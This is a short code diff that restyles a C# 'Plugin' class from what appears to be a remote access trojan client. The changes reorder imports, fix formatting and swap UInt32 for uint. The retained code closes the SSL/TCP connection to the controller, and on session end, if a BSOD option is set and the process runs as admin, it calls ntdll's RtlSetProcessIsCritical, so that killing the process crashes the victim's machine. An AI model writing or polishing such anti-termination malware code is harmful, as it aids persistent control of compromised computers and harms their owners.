@@ -1,16 +1,12 @@
-﻿using Microsoft.Win32;
-using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
+﻿using System;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
-using System.Text;
 using System.Threading;
+using Microsoft.Win32;
 
 namespace Plugin
 {
-   public static class Methods
+    public static class Methods
     {
         public static void ClientExit()
         {
@@ -22,7 +18,7 @@ namespace Plugin
                 Connection.SslClient?.Close();
                 Connection.TcpClient?.Close();
             }
-            catch(Exception ex) 
+            catch (Exception ex)
             {
                 Packet.Error(ex.Message);
             }
@@ -44,7 +40,7 @@ namespace Plugin
 
         public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
         {
-            if (Convert.ToBoolean(Plugin.BSOD) && Methods.IsAdmin())
+            if (Convert.ToBoolean(Plugin.BSOD) && IsAdmin())
                 ProcessCriticalExit();
         }
 
@@ -56,14 +52,11 @@ namespace Plugin
             }
             catch
             {
-                while (true)
-                {
-                    Thread.Sleep(100000); //prevents a BSOD on exit failure
-                }
+                while (true) Thread.Sleep(100000); //prevents a BSOD on exit failure
             }
         }
 
         [DllImport("ntdll.dll", SetLastError = true)]
-        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+        private static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
     }
 }
